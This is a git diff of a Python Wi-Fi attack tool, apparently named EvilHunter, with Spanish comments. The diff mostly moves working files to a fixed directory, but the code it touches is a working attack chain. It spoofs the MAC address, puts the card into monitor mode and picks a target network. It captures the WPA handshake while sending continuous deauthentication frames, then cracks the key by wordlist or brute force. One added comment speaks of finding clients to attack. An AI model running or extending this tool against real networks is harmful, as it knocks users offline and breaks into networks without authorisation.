@@ -24,13 +24,17 @@ except ModuleNotFoundError as e:
     print("[!] Exiting...")
     exit(1)
 
-# modificar la forma de procesar los datos:
+#
+# funciona... intentar conseguir clientes a los que atacar
 # MAC -> (([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2}))
+# Reestructurar el las carpteas creadas
+# Crear carpeta (EvilHunter_Data)
+#
 
 
 def delete_files():
-    os.system('find captures -type f ! -name "*.cap" -delete > /dev/null')
-    os.system('rm espec/*')
+    os.system('find /home/EvilHunter_Data/captures -type f ! -name "*.cap" -delete > /dev/null')
+    os.system('rm /home/EvilHunter_Data/espec/*')
 
 
 def restart_net():
@@ -77,7 +81,6 @@ def exiting(err):
     except NameError:
         pass
 
-
     print(Fore.WHITE + "  ·  ·  ·  · " + Fore.YELLOW + "[*] " + Fore.LIGHTCYAN_EX + "Deleting some files..."
           + Fore.RESET)
     delete_files()
@@ -100,13 +103,13 @@ def change_mac(interface):
 
     # Modificamos direccion MAC
     os.system(f"macchanger -r {interface} > new_mac.txt")
-    mc = os.system("cat new_mac.txt  | grep 'New' | awk '{print $2}' FS='MAC:' | awk '{print $1}' > espec/mac.txt")
+    mc = os.system("cat new_mac.txt  | grep 'New' | awk '{print $2}' FS='MAC:' | awk '{print $1}' > /home/EvilHunter_Data/espec/mac.txt")
 
     # Encendemos tarjeta de red
     os.system(f"bash -c 'ifconfig {interface} up'")
 
     if mc == 0:
-        mac = open("espec/mac.txt", "r"); mac = mac.read()
+        mac = open("/home/EvilHunter_Data/espec/mac.txt", "r"); mac = mac.read()
         return mac
     else:
         return None
@@ -198,10 +201,10 @@ def monitor_mode(choosed_interface):
     os.system("airmon-ng start %s > /dev/null" % choosed_interface)
 
     # Ver nombre de la interfaz
-    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > espec/intif")
-    os.system("cat espec/intif | grep {} > espec/iface".format(choosed_interface))
+    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /home/EvilHunter_Data/espec/intif")
+    os.system("cat /home/EvilHunter_Data/espec/intif | grep {} > /home/EvilHunter_Data/espec/iface".format(choosed_interface))
 
-    with open("espec/iface", "r") as iface:
+    with open("/home/EvilHunter_Data/espec/iface", "r") as iface:
         interface = iface.read()
     interface = interface.replace("\n", "")
 
@@ -216,9 +219,8 @@ def monitor_mode(choosed_interface):
         print(Fore.BLUE + "\n\t[" + Fore.RED + "V" + Fore.BLUE + "] " + Fore.LIGHTYELLOW_EX +
               "Dirección MAC no modificada correctamente..." + Fore.LIGHTCYAN_EX + f"{mac}.")
 
-
-    os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' | cut -d: -f2 > espec/mode".format(interface))
-    with open("espec/mode", "r") as mde:
+    os.system("iwconfig {} | grep -Eo 'Mode:([A-Z][a-z]+)' | cut -d: -f2 > /home/EvilHunter_Data/espec/mode".format(interface))
+    with open("/home/EvilHunter_Data/espec/mode", "r") as mde:
         mode = mde.read().strip()
     try:
         if mode != "Monitor":
@@ -231,15 +233,11 @@ def monitor_mode(choosed_interface):
 def list_save_interf():
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTCYAN_EX + "Mostrando Intefaces Disponibles...")
 
-    direc = "espec"
-
-    if not os.path.exists(direc):
-        os.makedirs(direc)
     time.sleep(1)
     # Creamos archivo con interfaces disponibles
-    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > espec/net")
+    os.system("ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > /home/EvilHunter_Data/espec/net")
     nums = 0
-    with open("espec/net", "r") as ifaces:
+    with open("/home/EvilHunter_Data/espec/net", "r") as ifaces:
         ifa = ifaces.read()
     ifaces = ifa.split("\n")
 
@@ -305,7 +303,8 @@ def get_options(args):
             output = hand.stdout.readline()
             if not output:
                 break
-            all_got.append(output)
+            if output not in all_got:
+                all_got.append(output)
             print(output.decode().strip())
         except KeyboardInterrupt:
             break
@@ -319,24 +318,24 @@ def process_data(all_got, args):
     print(Fore.BLUE + "\n\t[Y] " + Fore.YELLOW + "Processing data")
     time.sleep(1)
 
-    with open("espec/data", "wb") as data:
+    with open("/home/EvilHunter_Data/espec/data", "wb") as data:
         for line in all_got:
             data.write(line)
 
     # Filtramos el archivo
-    os.system('cat espec/data | grep -oP "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | sort -u > espec/bssid')
+    os.system('cat /home/EvilHunter_Data/espec/data | grep -oP "([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}" | sort -u > /home/EvilHunter_Data/espec/bssid')
 
     # Abriumos el arhivo de bssids
-    with open("espec/bssid", "rb") as bssids:
+    with open("/home/EvilHunter_Data/espec/bssid", "rb") as bssids:
         bssids = (bssids.read()).decode()
     bssids = bssids.split("\n")
 
     for bssid in bssids:
         if not bssid:
             continue
-        os.system("cat espec/data | grep {} | sort -u > espec/{}".format(bssid, bssid))
+        os.system("cat /home/EvilHunter_Data/espec/data | grep {} | sort -u > /home/EvilHunter_Data/espec/{}".format(bssid, bssid))
 
-        with open("espec/"+bssid, "rb") as all_data:
+        with open("/home/EvilHunter_Data/espec/"+bssid, "rb") as all_data:
             all_data = all_data.read()
         data = all_data.decode().split()
 
@@ -390,7 +389,7 @@ def print_process_data(dict, args):
               + Fore.YELLOW + "[+] " + Fore.BLUE + "Channel -> " + Fore.GREEN + "{}".format(dict[network]['channel']) +
               "\t\t" + Fore.YELLOW + "[+] " + Fore.BLUE + "Encryption -> " + Fore.GREEN + "{}".format(
             dict[network]["encription_type"]))
-        print("\n\t", "▄" * 80, "\n")
+        print("\n\n\t", Fore.LIGHTYELLOW_EX + "▄" * 115, "\n\n")
 
     network_to_attack = None
     while not network_to_attack:
@@ -413,18 +412,17 @@ def prepare_attack(dict, network_to_attack, args):
         file = input(Fore.YELLOW + "\n\t[" + Fore.RED + "S" + Fore.YELLOW + "] " + 
                      Fore.LIGHTCYAN_EX + "Enter the name of the file to save [E.j capture1] > ")
 
-        if os.system("find captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
+        if os.system("find /home/EvilHunter_Data/captures/{}/{}* 2>/dev/null 1>/dev/null".format(network_to_attack, file)) == 0:
             print(Fore.RED + "\n\t\t[!] " + Fore.YELLOW + "Este nombre ya esta usado por algún archivo.")
             file = None
 
     # Definimos bssid y channel
     bssid = dict[network_to_attack]['bssid']
     ch = dict[network_to_attack]['channel']
-    # Leer handshake
-    direc = "captures/" + network_to_attack
 
-    if not os.path.exists(direc):
-        os.makedirs(direc)
+    # Leer handshake
+    direc = "/home/EvilHunter_Data/captures/" + network_to_attack
+
     time.sleep(1)
     print(Fore.YELLOW + "\n[*] " + Fore.LIGHTRED_EX + "INICIANDO:" + Fore.LIGHTCYAN_EX + " Captura de " +
           Fore.RED + 'WPA handshake ' + Fore.LIGHTCYAN_EX +
@@ -442,8 +440,10 @@ def prepare_attack(dict, network_to_attack, args):
 
 
 def capture_handshake(direc, args, bssid, ch, file, network_to_attack):
+    if not os.path.exists(f"/home/EvilHunter_Data/captures/{network_to_attack}/"):
+        os.makedirs(f"/home/EvilHunter_Data/captures/{network_to_attack}/")
 
-    hand = subprocess.Popen(["airodump-ng", "-w", f"captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
+    hand = subprocess.Popen(["airodump-ng", "-w", f"/home/EvilHunter_Data/captures/{network_to_attack}/" + file, "-c", ch, "--bssid", bssid,
                              f"{interface}"], stdout=subprocess.PIPE)
 
     subprocess.Popen(['aireplay-ng', '--deauth', "0", "-a", bssid, interface], stdout=subprocess.DEVNULL)
@@ -481,10 +481,10 @@ def find_wordlists(wordlists):
 
 def crack_handshake(direc, args, file, network_to_attack):
     # Buscamos arhchivo .cap
-    os.system("find {}/{}*.cap > espec/capture_file ".format(direc, file))
+    os.system("find {}/{}*.cap > /home/EvilHunter_Data/espec/capture_file ".format(direc, file))
 
     # Abrimos el capture_file donde se encuentra la ruta hacia  el .cap
-    with open("espec/capture_file", "r") as file:
+    with open("/home/EvilHunter_Data/espec/capture_file", "r") as file:
         file = file.read().strip()
 
     # Comprobamos si nos ha pasasdo discionario y si existe en su sistema o si quiere brute
@@ -523,6 +523,8 @@ def crack_handshake(direc, args, file, network_to_attack):
                 found = True
                 break
         except KeyboardInterrupt:
+            crack.terminate()
+            found = None
             break
 
     if not found:
@@ -537,6 +539,18 @@ def crack_handshake(direc, args, file, network_to_attack):
                 evilCracker.startbrute(file, "r", 200, network_to_attack)
         else:
             exiting(err='done')
+
+
+def organize_dirs():
+    if not os.path.exists("/home/EvilHunter_Data"):
+        os.makedirs("/home/EvilHunter_Data")
+        os.system('chmod 755 /home/EvilHunter_Data')
+    if not os.path.exists("/home/EvilHunter_Data/captures"):
+        os.makedirs("/home/EvilHunter_Data/captures")
+        os.system('chmod 755 /home/EvilHunter_Data/captures')
+    if not os.path.exists("/home/EvilHunter_Data/espec"):
+        os.makedirs("/home/EvilHunter_Data/espec")
+        os.system('chmod 755 /home/EvilHunter_Data/espec')
 
 
 def main():
@@ -590,12 +604,7 @@ def main():
         am_i_root()
 
         # Carpetas necesarias
-        if not os.path.exists("captures"):
-            os.makedirs("captures")
-            os.system('chmod 777 captures')
-        if not os.path.exists("espec"):
-            os.makedirs("espec")
-            os.system('chmod 777 espec')
+        organize_dirs()
 
         # Tenemos las herraientas?
         check_utilities()
@@ -612,8 +621,6 @@ def main():
     # Salida manual
     except KeyboardInterrupt:
         exiting(err=False)
-
-
 
 
 if __name__ == "__main__":
